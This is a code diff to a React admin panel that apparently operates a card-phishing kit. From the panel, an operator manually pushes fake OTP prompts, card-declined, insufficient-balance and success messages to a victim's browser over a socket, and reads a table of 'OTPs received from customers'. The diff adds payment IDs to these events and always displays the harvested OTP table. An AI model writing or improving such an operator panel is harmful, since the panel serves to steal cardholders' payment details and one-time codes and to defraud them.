@@ -172,6 +172,8 @@ const Admin = () => {
   }, []);
 
   const handleAction = (paymentId: string, action: string) => {
+    console.log('Handle action called:', action, 'Payment ID:', paymentId);
+    
     try {
       if (!socket) {
         console.error('Socket not connected');
@@ -195,48 +197,51 @@ const Admin = () => {
 
       switch (action) {
         case 'show-otp':
-          socket.emit('show-otp');
+          console.log('Emitting show-otp event');
+          socket.emit('show-otp', { paymentId });
           toast({
             title: "Command Initiated",
             description: "OTP request sent to client",
           });
           break;
         case 'validate-otp':
-          socket.emit('payment-approved');
+          console.log('Emitting payment-approved event');
+          socket.emit('payment-approved', { paymentId });
           updatePaymentStatus(paymentId, 'approved');
-          // Clear OTP after validation
-          setOtps([]);
           toast({
             title: "Command Initiated",
             description: "Payment approved - client redirecting to success page",
           });
           break;
         case 'fail-otp':
-          socket.emit('invalid-otp-error');
+          console.log('Emitting invalid-otp-error event');
+          socket.emit('invalid-otp-error', { paymentId });
           toast({
             title: "Command Initiated",
             description: "Invalid OTP response sent to client",
           });
           break;
         case 'card-declined':
-          socket.emit('card-declined-error');
+          console.log('Emitting card-declined-error event');
+          socket.emit('card-declined-error', { paymentId });
+          updatePaymentStatus(paymentId, 'rejected');
           toast({
             title: "Command Initiated", 
             description: "Card declined response sent to client",
           });
           break;
         case 'insufficient-balance':
-          socket.emit('insufficient-balance-error');
+          console.log('Emitting insufficient-balance-error event');
+          socket.emit('insufficient-balance-error', { paymentId });
           toast({
             title: "Command Initiated",
             description: "Insufficient balance response sent to client", 
           });
           break;
         case 'successful':
-          socket.emit('payment-approved');
+          console.log('Emitting payment-approved event for success');
+          socket.emit('payment-approved', { paymentId });
           updatePaymentStatus(paymentId, 'approved');
-          // Clear OTP after success
-          setOtps([]);
           toast({
             title: "Command Initiated", 
             description: "Payment successful - client redirecting to success page",
@@ -577,12 +582,17 @@ const Admin = () => {
         </div>
 
         {/* OTP Data Table */}
-        {otps.length > 0 && (
-          <div className="bg-gray-900 rounded-lg overflow-hidden">
-            <div className="p-6 border-b border-gray-700">
-              <h2 className="text-xl font-semibold">OTP Submissions</h2>
-              <p className="text-gray-400 mt-1">OTPs received from customers</p>
+        <div className="bg-gray-900 rounded-lg overflow-hidden">
+          <div className="p-6 border-b border-gray-700">
+            <h2 className="text-xl font-semibold">OTP Submissions</h2>
+            <p className="text-gray-400 mt-1">OTPs received from customers ({otps.length} total)</p>
+          </div>
+          
+          {otps.length === 0 ? (
+            <div className="p-8 text-center text-gray-500">
+              No OTP submissions at the moment
             </div>
+          ) : (
             
             <div className="overflow-x-auto">
               <table className="w-full">
@@ -626,8 +636,8 @@ const Admin = () => {
                 </tbody>
               </table>
             </div>
-          </div>
-        )}
+          )}
+        </div>
       </div>
     </div>
   );
